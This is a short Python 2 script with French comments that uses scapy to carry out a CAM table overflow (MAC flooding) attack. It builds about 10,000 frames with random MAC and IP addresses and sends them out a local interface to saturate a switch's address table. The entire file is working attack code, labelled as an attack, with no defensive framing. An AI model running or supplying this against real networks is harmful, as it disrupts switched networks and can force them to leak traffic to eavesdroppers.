#!/usr/bin/env python
from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp


'''Afin de saturer la table l'attaque doit être très efficace et rapide.
   Alors on génère la liste de paquet avant de tout envoyer.
'''

def generate_packets():
    packet_list = []        #initializing packet_list to hold all the packets
    for i in xrange(1,10000):
        packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
        packet_list.append(packet)
    return packet_list

##On forge le paquet pour l'attaque
def cam_overflow(packet_list):
    sendp(packet_list, iface='ens33')

##On attaque
if __name__ == '__main__':
    packet_list = generate_packets()
    cam_overflow(packet_list)